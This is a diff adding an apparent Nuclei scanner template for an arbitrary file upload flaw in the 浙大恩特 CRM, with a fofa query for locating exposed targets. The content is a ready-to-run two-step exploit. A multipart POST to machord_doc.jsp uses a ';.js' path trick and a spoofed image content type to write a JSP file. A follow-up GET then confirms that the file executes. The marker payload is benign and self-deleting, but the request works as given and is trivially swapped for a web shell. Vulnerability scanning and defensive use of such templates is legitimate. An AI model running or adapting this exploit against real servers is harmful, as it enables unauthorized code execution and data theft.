@@ -1,0 +1,60 @@
+id: zju-ente-crm-file-upload
+
+info:
+  name: "浙大恩特客户资源管理系统 machord_doc.jsp 接口任意文件上传"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="浙大恩特客户资源管理系统"
+
+    浙大恩特客户资源管理系统存在 machord_doc.jsp 接口文件上传缺陷，攻击者可利用该接口上传任意文件至目标服务器。该漏洞允许通过构造恶意请求实现非授权文件写入，可能导致远程代码执行或敏感数据泄露。
+
+    CVE编号：暂无
+    日期：2023-12-04
+    参考：https://example.com/reference
+  tags: 浙大恩特客户资源管理系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=NTest.jsp&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQzxXQpKIb1f32N11
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+    Content-Disposition: form-data; name="oprfilenam"
+
+    null
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+    Content-Disposition: form-data; name="uploadflg"
+
+    0
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+    Content-Disposition: form-data; name="strAffixStr"
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+    Content-Disposition: form-data; name="selfilenam"
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+    Content-Disposition: form-data; name="uploadfile"; filename="NTest.jsp"
+    Content-Type: image/png
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11--
+- raw:
+  - |
+    GET /enterdoc/Machord/NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
